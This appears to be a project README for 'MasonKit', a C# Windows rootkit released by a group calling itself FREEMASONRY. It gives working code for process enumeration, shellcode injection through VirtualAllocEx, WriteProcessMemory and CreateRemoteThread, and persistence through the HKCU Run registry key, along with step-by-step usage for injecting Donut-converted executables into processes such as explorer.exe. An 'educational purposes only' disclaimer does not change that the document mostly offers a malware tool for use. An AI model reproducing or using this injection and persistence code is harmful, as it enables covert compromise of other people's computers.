# MasonKit - Rootkit Project

![MasonKit](https://i.ibb.co/LzP0f7G3/image.png)

## Overview
MasonKit is a **Rootkit** project developed by **ABOLHB** from the **FREEMASONRY** group. The primary purpose of this tool is to **hide a program from the process list** and **inject it into any system file** of your choice. This project is intended for **educational purposes only**, and the creator and contributors are **not responsible** for any misuse or illegal activities performed using this tool.

---

## Disclaimer
This project is shared for **educational and research purposes only**. The creator, contributors, and the FREEMASONRY group are **not responsible** for any illegal or unethical use of this tool. Use it at your own risk, and ensure you have proper authorization before using it in any environment.

---

## Features
1. **Process Hiding**: The Rootkit hides the target process from the system's process list.
2. **Shellcode Injection**: Injects custom shellcode into a specified system process.
3. **Persistence**: Optionally adds the Rootkit to the system's startup registry.
4. **Customizable**: Allows users to specify the target process and shellcode file.

---

## Code Explanation

### 1. **Main Components**
The project is built using **C#** and utilizes the **Windows API** for low-level system operations. Below is a detailed breakdown of the code:

---

### 2. **MasonForm Class**
This is the main form class for the application. It handles user interactions and initiates the Rootkit functionality.

#### Key Methods:
- **`Form1_Load`**: Initializes the form and sets default values for UI elements.
- **`guna2Button1_Click`**: Handles the injection process. It reads the shellcode from a `.bin` file, compiles it into a new executable, and injects it into the target process.
- **`guna2Button2_Click`**: Allows the user to select an executable file, converts it into shellcode using **Donut**, and saves it as `shellcode.bin`.

---

### 3. **Rootkit Functionality**
The Rootkit is implemented in the dynamically generated C# code. Below is a breakdown of its key components:

#### **Constants and Imports**
```csharp
const int PROCESS_ALL_ACCESS = 0x1F0FFF;
const uint MEM_COMMIT = 0x1000;
const uint MEM_RESERVE = 0x2000;
const uint PAGE_EXECUTE_READWRITE = 0x40;
const uint MEM_RELEASE = 0x8000;
```
These constants define memory allocation and process access permissions.

#### **Windows API Functions**
- **`CreateToolhelp32Snapshot`**: Takes a snapshot of the system's processes.
- **`Process32First`** and **`Process32Next`**: Enumerate processes in the snapshot.
- **`OpenProcess`**: Opens a handle to the target process.
- **`VirtualAllocEx`**: Allocates memory in the target process.
- **`WriteProcessMemory`**: Writes shellcode into the allocated memory.
- **`CreateRemoteThread`**: Executes the shellcode in the target process.

#### **Process Enumeration**
```csharp
static uint GetProcessIdByName(string processName)
{
    uint processId = 0;
    IntPtr snapshot = CreateToolhelp32Snapshot(0x2, 0);
    PROCESSENTRY32 processEntry = new PROCESSENTRY32 { dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32)) };
    if (Process32First(snapshot, ref processEntry))
    {
        do
        {
            if (processName == processEntry.szExeFile)
            {
                processId = processEntry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, ref processEntry));
    }
    CloseHandle(snapshot);
    return processId;
}
```
This function retrieves the process ID of the target process by name.

#### **Shellcode Injection**
```csharp
IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, processId);
IntPtr pRemoteMemory = VirtualAllocEx(hProcess, IntPtr.Zero, shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, pRemoteMemory, shellcode, shellcode.Length, out int bytesWritten);
IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, pRemoteMemory, IntPtr.Zero, 0, IntPtr.Zero);
```
This code injects the shellcode into the target process and executes it.

#### **Persistence**
```csharp
static void AddToStartup()
{
    string appPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
    using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
    {
        if (key != null)
        {
            key.SetValue("MyApplication", appPath);
        }
    }
}
```
This method adds the Rootkit to the system's startup registry for persistence.

---

### 4. **Donut Integration**
The project uses **Donut** to convert executable files into shellcode. The shellcode is then injected into the target process.

---

## Usage
1. **Select Target Process**: Enter the name of the target process (e.g., `explorer.exe`).
2. **Load Shellcode**: Use the `Load Shellcode` button to convert an executable into shellcode.
3. **Inject**: Click the `Inject` button to inject the shellcode into the target process.
4. **Persistence**: Enable the `Add to Startup` checkbox to ensure the Rootkit runs on system startup.

---

## Ethical Considerations
- **Authorization**: Always ensure you have proper authorization before using this tool.
- **Legal Compliance**: Misuse of this tool may violate local and international laws.
- **Educational Use**: This project is intended for educational purposes only.

---

## Credits
- **ABOLHB**: Creator of MasonKit.
- **FREEMASONRY Group**: The group behind the project.

---

## Links
- [GitHub Repository](https://github.com/MasonGroup)
- [Discord Server](https://discord.gg/dvXH85CfpN)
- [Instagram](https://www.instagram.com/g7m9)

